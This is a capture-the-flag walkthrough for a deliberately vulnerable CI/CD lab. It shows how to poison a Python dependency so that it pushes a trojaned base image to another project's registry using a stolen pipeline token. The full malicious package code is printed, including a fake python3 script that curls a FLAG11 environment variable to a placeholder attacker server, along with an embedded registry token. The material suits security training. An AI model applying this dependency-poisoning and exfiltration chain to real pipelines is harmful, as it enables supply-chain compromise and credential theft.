[![CICD-SEC-3 Dependency Chain Abuse](https://img.shields.io/badge/CICD--SEC--3-Dependency%20Chain%20Abuse-brightgreen)](https://www.cidersecurity.io/top-10-cicd-security-risks/dependency-chain-abuse/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_100422)
[![CICD-SEC-6 Insufficient Credential Hygiene](https://img.shields.io/badge/CICD--SEC--6-Insufficient%20Credential%20Hygiene-brightgreen)](https://www.cidersecurity.io/top-10-cicd-security-risks/insufficient-credential-hygiene/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_100422)

Let's explore what we have when signing in to the compromised GitLab:
You are the maintainer of *pygryphon* package, there are also public projects *nest-of-gold* and *awesome-app* which we have a read-only access.
<BR><BR>
As the instructions of this challenge hint us, let's try to see if we can find any reference to *Flag11*.
<BR>
A simple search tells us it is being referenced by *nest-of-gold* project 
<BR><BR><BR>

![grpyhon](../images/gryphon-1.png "grpyhon")

<BR>
We can see that *Flag11* is used in a pipeline that ships a container used in production.
Let's go to this pipeline scheduling, we can see that user named "gryphon" is the is involved in this pipeline, and this user is also the invovled in the *awesome-app* project's pipeline.
  
Diving into *awesome-app*, it is using our pygrphon package as a dependency!  
this is what the *requirments.txt* file looks like:
  
```
--extra-index-url http://token:cd79dd622c6d463a574635e874765c0b@gitlab/api/v4/projects/pygryphon%2Fpygryphon/packages/pypi/simple --trusted-host gitlab

pytest==7.2.0
flask==2.0.3
Werkzeug==2.0.3
pygryphon==1.0.13
```
<BR>

This means we can influence *awesome-app* pipeline by uploading a new malicious python package of *pygrphon*.
Our end goal is within *nest-of-gold* project, how can we influence it's pipeline?
  
Because our end goal is to reach the "production" docker produced by *nest-of-gold* pipeline, let's have a look at the Dockerfile inside *nest-of-gold* we can see it is dependent on python:3.8 docker image from nest-of-gold container registry and not the offical registrar.
  
```docker
FROM gitlab:5050/wonderland/nest-of-gold/python:3.8

WORKDIR /app
COPY app.py .
COPY requirements.txt .
RUN pip3 install -r requirements.txt

CMD [ "python3", "-m" , "flask", "run", "--host=0.0.0.0"]
```
  
Here's comes the tricky part 🥸, let's create a malicious pygryphon package that pushes a malicious python3.8 docker base image to *nest-of-gold* container registry, 
    

In the pipeline of *awesome-app* we can see a PAT behing used named *TOKEN*
<BR>
`docker login -u gryphon -p $TOKEN $CI_REGISTRY`    
Let's try to steal/use this token against the *nest-of-gold* container registry.     
In this package let's create a script named "python3" that the docker image of *nest-of-gold* will execute mistakenly instead of the actual python3 interpreter.   
modified greet.py content:

```python
import subprocess

DOCKERFILE = """FROM python:3.8
COPY python3 /usr/local/bin/
COPY python3 /usr/local/bin/pip3"""
# Exfiltrate Flag11, replace attacker server with public facing server, you may ngrok or simliar tools
PYTHON3 = """#!/bin/bash
env | grep FLAG11 | curl -X POST --data-binary @- https://ATTACKER[.]SERVER/"""


def run(cmd):
    proc = subprocess.run(cmd, shell=True, timeout=180)
    print(proc.stdout)
    print(proc.stderr)


def hello(name):
    """
    We will build and push a malicous docker image as if it were python 3.8, but in fact 
    the python3 binary will be our evil script
    """
    run('apk add docker-cli')
    with open('Dockerfile', 'w') as f:
        f.write(DOCKERFILE)
    with open('python3', 'w') as f:
        f.write(PYTHON3)
    # Giving our script execution permission    
    run('chmod +x python3')
    # Building the docker file
    run('DOCKER_HOST=tcp://docker:2375 docker build -t gitlab:5050/wonderland/nest-of-gold/python:3.8 .')
    # Login to the docker registry using TOKEN
    run('DOCKER_HOST=tcp://docker:2375 docker login -u gryphon -p $TOKEN $CI_REGISTRY')
    # Pusing to the registry our malicious python docker image
    run('DOCKER_HOST=tcp://docker:2375 docker push gitlab:5050/wonderland/nest-of-gold/python:3.8')    
    return "Hello, " + name
```

And then build and upload this package to gryphon package registry (after we have configured "gitlab" as our a package registry 

Conveniently you may use these files to build the package:  

[.pypirc](/tests/data/pygryphon./.pypirc)
<BR>
[pyproject.toml](/tests/data/pygryphon./pyproject.toml)


```sh
pipenv run python3 -m build [path_to_package]
pipenv run python3 -m twine upload -r gitlab
```

Now prepare a cup of coffe ☕️ and wait for the two pipelines scheduling to take place, excpet the flag arriving to your http server.
